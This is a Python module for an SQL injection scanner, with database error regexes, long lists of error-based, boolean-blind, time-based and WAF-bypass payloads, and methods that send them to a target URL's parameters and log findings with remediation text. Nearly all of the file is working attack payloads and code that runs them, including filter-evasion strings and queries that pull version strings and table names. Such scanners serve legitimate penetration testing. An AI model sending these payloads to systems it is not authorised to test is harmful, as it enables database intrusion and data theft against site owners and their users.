"""Complete SQL Injection Scanner Module.

Supports error-based, boolean-blind, and time-based blind SQL injection
detection across MySQL, MSSQL, PostgreSQL, Oracle, and SQLite.
"""

import re
import time
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urlencode

from utils.http_client import HttpClient
from utils.encoder import Encoder


class SQLiScanner:
    """SQL Injection vulnerability scanner."""

    # SQL error patterns by database type
    ERROR_PATTERNS = {
        'MySQL': [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[HY000\]",
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)",
            r"You have an error in your SQL syntax",
        ],
        'PostgreSQL': [
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"PostgreSQL query failed",
            r"org\.postgresql\.jdbc",
            r"PSQLException",
        ],
        'MSSQL': [
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"OLE DB.*? SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver",
            r"Warning.*?mssql_",
            r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"(?s)Exception.*?\bRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            r"\[SQL Server\]",
            r"ODBC SQL Server Driver",
            r"ODBC Driver.*? for SQL Server",
            r"SQLServer JDBC Driver",
            r"com\.jnetdirect\.jsql",
            r"macabordar\.com",
            r"Unclosed quotation mark after the character string",
            r"Conversion failed when converting",
        ],
        'Oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\Woci_",
            r"Warning.*?\Wora_",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            r"OracleException",
            r"oracle\.jdbc",
        ],
        'SQLite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?sqlite_",
            r"Warning.*?SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error \d+:",
            r"sqlite3\.OperationalError:",
            r"SQLite3::SQLException",
            r"org\.sqlite\.JDBC",
            r"SQLiteException",
        ],
    }

    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' #",
        "' OR 1=1--",
        "\" OR 1=1--",
        "1' ORDER BY 1--+",
        "1' ORDER BY 100--+",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1 AND 1=CONVERT(int,(SELECT @@version))--",
        "1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1--",
        "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
        "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1;SELECT * FROM information_schema.tables--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames having 1=1--",
        "1' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(0)))a)",
        "';WAITFOR DELAY '0:0:0'--",
        "1;SELECT pg_sleep(0)--",
        "' || (SELECT '' FROM dual) || '",
        "' || (SELECT '' FROM users WHERE ROWNUM = 1) || '",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "' OR ''='",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
    ]

    # Boolean-based blind payloads (pairs: true condition, false condition)
    BOOLEAN_PAYLOADS = [
        ("' OR 1=1--", "' OR 1=2--"),
        ("' OR 'a'='a'--", "' OR 'a'='b'--"),
        ("\" OR 1=1--", "\" OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("1) OR 1=1--", "1) OR 1=2--"),
        ("1')) OR 1=1--", "1')) OR 1=2--"),
        ("' OR 1=1#", "' OR 1=2#"),
        ("' OR 'x'='x", "' OR 'x'='y"),
        ("') OR ('1'='1", "') OR ('1'='2"),
        ("')) OR (('1'='1", "')) OR (('1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ("1' AND 1=1#", "1' AND 1=2#"),
        ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=2"),
        ("' AND (SELECT 'a')='a'--", "' AND (SELECT 'a')='b'--"),
        ("1' AND (SELECT COUNT(*) FROM users)>0--", "1' AND (SELECT COUNT(*) FROM users)<0--"),
        ("' AND SUBSTRING(@@version,1,1)='5'--", "' AND SUBSTRING(@@version,1,1)='z'--"),
        ("' AND (SELECT LENGTH(database()))>0--", "' AND (SELECT LENGTH(database()))<0--"),
    ]

    # Time-based blind payloads by database
    TIME_PAYLOADS = {
        'MySQL': [
            "' OR SLEEP({delay})--",
            "' OR SLEEP({delay})#",
            "\" OR SLEEP({delay})--",
            "1' AND SLEEP({delay})--",
            "1' AND SLEEP({delay})#",
            "1 AND (SELECT * FROM (SELECT(SLEEP({delay})))a)",
            "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            "1' UNION SELECT SLEEP({delay})--",
            "' OR (SELECT SLEEP({delay}) FROM dual WHERE 1=1)--",
            "1' AND IF(1=1,SLEEP({delay}),0)--",
            "1' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)--",
            "' XOR SLEEP({delay})--",
            "' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))a)='1",
            "1;SELECT SLEEP({delay})--",
            "1' RLIKE SLEEP({delay})--",
        ],
        'MSSQL': [
            "';WAITFOR DELAY '0:0:{delay}'--",
            "\";WAITFOR DELAY '0:0:{delay}'--",
            "1;WAITFOR DELAY '0:0:{delay}'--",
            "1);WAITFOR DELAY '0:0:{delay}'--",
            "1'));WAITFOR DELAY '0:0:{delay}'--",
            "' IF 1=1 WAITFOR DELAY '0:0:{delay}'--",
            "1;IF(1=1) WAITFOR DELAY '0:0:{delay}'--",
            "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
            "1 AND 1=1;WAITFOR DELAY '0:0:{delay}'--",
            "');WAITFOR DELAY '0:0:{delay}'--",
        ],
        'PostgreSQL': [
            "';SELECT pg_sleep({delay})--",
            "\";SELECT pg_sleep({delay})--",
            "1;SELECT pg_sleep({delay})--",
            "' OR pg_sleep({delay})--",
            "1' AND (SELECT pg_sleep({delay}))--",
            "' AND 1=(SELECT 1 FROM pg_sleep({delay}))--",
            "1;SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
            "' || pg_sleep({delay})--",
            "1' UNION SELECT pg_sleep({delay})--",
            "';SELECT CASE WHEN 1=1 THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
        ],
        'Oracle': [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1--",
            "' AND UTL_INADDR.get_host_name('10.0.0.1')='10.0.0.1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1--",
        ],
        'SQLite': [
            "' AND 1=randomblob({delay}00000000)--",
            "1 AND 1=randomblob({delay}00000000)",
            "' OR 1=randomblob({delay}00000000)--",
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))--",
        ],
    }

    # WAF bypass techniques
    WAF_BYPASS_PAYLOADS = [
        # Case variation
        "' oR 1=1--",
        "' UnIoN SeLeCt NULL--",
        # Comment injection
        "' UN/**/ION SEL/**/ECT NULL--",
        "' /*!UNION*/ /*!SELECT*/ NULL--",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        # Whitespace alternatives
        "' UNION%0aSELECT%0aNULL--",
        "' UNION%09SELECT%09NULL--",
        "' UNION%0dSELECT%0dNULL--",
        "' UNION%0bSELECT%0bNULL--",
        # Encoding
        "' %55NION %53ELECT NULL--",
        "' UNION%23%0aSELECT NULL--",
        # Double encoding
        "%2527%2520OR%25201%253D1--",
        # HPP (HTTP Parameter Pollution)
        "' OR '1'='1",
        # Scientific notation
        "' OR 1e0=1e0--",
        # No spaces
        "'OR'1'='1'--",
        "'UNION(SELECT(NULL))--",
        # String concatenation
        "' OR 'a'||'b'='ab'--",
        "' OR CONCAT('a','b')='ab'--",
        "' OR 'a'+'b'='ab'--",
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0,
                 time_delay: int = 5):
        """Initialize SQLi scanner.

        Args:
            http_client: Optional HTTP client instance
            timeout: Request timeout in seconds
            time_delay: Delay in seconds for time-based tests
        """
        self.client = http_client or HttpClient(timeout=timeout + time_delay + 5)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []
        self.time_delay = time_delay

    def scan_error_based(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Detect SQL injection via error messages.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings with vulnerability details
        """
        findings = []

        for param_name in params:
            for payload in self.ERROR_PAYLOADS:
                try:
                    test_params = {**params, param_name: payload}
                    response = self.client.get(url, params=test_params)
                    response_text = response.text

                    # Check for SQL error patterns
                    db_type = self._detect_db_type(response_text)
                    if db_type:
                        finding = {
                            'type': 'Error-Based SQL Injection',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': self._extract_error(response_text, db_type),
                            'database': db_type,
                            'remediation': 'Use parameterized queries/prepared statements. Implement input validation. Disable verbose error messages in production.',
                            'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                        }
                        findings.append(finding)
                        break  # One finding per parameter

                except Exception:
                    continue

        return findings

    def scan_boolean_blind(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Detect boolean-based blind SQL injection.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings
        """
        findings = []

        # First, get baseline response
        try:
            baseline_resp = self.client.get(url, params=params)
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except Exception:
            return findings

        for param_name in params:
            for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
                try:
                    # Test TRUE condition
                    true_params = {**params, param_name: true_payload}
                    true_resp = self.client.get(url, params=true_params)

                    # Test FALSE condition
                    false_params = {**params, param_name: false_payload}
                    false_resp = self.client.get(url, params=false_params)

                    # Compare responses
                    true_length = len(true_resp.text)
                    false_length = len(false_resp.text)

                    # Significant difference between true/false indicates blind SQLi
                    length_diff = abs(true_length - false_length)
                    status_diff = true_resp.status_code != false_resp.status_code

                    # True condition should match baseline more closely
                    true_baseline_diff = abs(true_length - baseline_length)
                    false_baseline_diff = abs(false_length - baseline_length)

                    if (length_diff > 50 or status_diff) and true_baseline_diff < false_baseline_diff:
                        # Verify with a second test
                        verify_params = {**params, param_name: true_payload}
                        verify_resp = self.client.get(url, params=verify_params)

                        if abs(len(verify_resp.text) - true_length) < 20:
                            finding = {
                                'type': 'Boolean-Based Blind SQL Injection',
                                'severity': 'HIGH',
                                'url': url,
                                'parameter': param_name,
                                'payload': f"TRUE: {true_payload} | FALSE: {false_payload}",
                                'evidence': f"Response length diff: {length_diff} bytes. TRUE={true_length}, FALSE={false_length}, Baseline={baseline_length}",
                                'remediation': 'Use parameterized queries/prepared statements. Implement input validation.',
                                'curl_command': self.client.build_curl_command('GET', url, params=true_params),
                            }
                            findings.append(finding)
                            break

                except Exception:
                    continue

        return findings

    def scan_time_blind(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Detect time-based blind SQL injection.

        Tests SLEEP (MySQL), WAITFOR DELAY (MSSQL), pg_sleep (PostgreSQL),
        DBMS_PIPE.RECEIVE_MESSAGE (Oracle), and randomblob (SQLite).

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings
        """
        findings = []
        delay = self.time_delay

        # Get baseline response time
        try:
            _, baseline_time = self.client.timed_get(url, params=params)
        except Exception:
            baseline_time = 1.0

        for param_name in params:
            found = False
            for db_type, payloads in self.TIME_PAYLOADS.items():
                if found:
                    break
                for payload_template in payloads:
                    if found:
                        break
                    try:
                        payload = payload_template.format(delay=delay)
                        test_params = {**params, param_name: payload}

                        # First test
                        _, elapsed1 = self.client.timed_get(url, params=test_params)

                        # Check if response was delayed
                        if elapsed1 >= baseline_time + delay - 1:
                            # Verify with a second test (shorter delay)
                            verify_payload = payload_template.format(delay=max(1, delay - 2))
                            verify_params = {**params, param_name: verify_payload}
                            _, elapsed2 = self.client.timed_get(url, params=verify_params)

                            # Confirm: first test slow, verify proportionally faster
                            if elapsed1 > elapsed2 and elapsed1 >= delay - 1:
                                finding = {
                                    'type': 'Time-Based Blind SQL Injection',
                                    'severity': 'HIGH',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': f"Response delayed by {elapsed1:.2f}s (baseline: {baseline_time:.2f}s, delay requested: {delay}s)",
                                    'database': db_type,
                                    'remediation': 'Use parameterized queries/prepared statements. Implement input validation. Set query timeouts.',
                                    'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                                }
                                findings.append(finding)
                                found = True

                    except ConnectionError:
                        continue
                    except Exception:
                        continue

        return findings

    def _detect_db_type(self, error_text: str) -> Optional[str]:
        """Identify the database type from error messages.

        Args:
            error_text: Response text containing potential SQL errors

        Returns:
            Database type string or None
        """
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, error_text, re.IGNORECASE):
                    return db_type
        return None

    def _extract_error(self, response_text: str, db_type: str) -> str:
        """Extract the SQL error message from response."""
        for pattern in self.ERROR_PATTERNS.get(db_type, []):
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Get surrounding context
                start = max(0, match.start() - 20)
                end = min(len(response_text), match.end() + 100)
                return response_text[start:end].strip()
        return f"{db_type} error detected in response"

    def scan_all(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Run all SQL injection tests.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            Combined list of all findings
        """
        all_findings = []
        all_findings.extend(self.scan_error_based(url, params))
        all_findings.extend(self.scan_boolean_blind(url, params))
        all_findings.extend(self.scan_time_blind(url, params))
        return all_findings
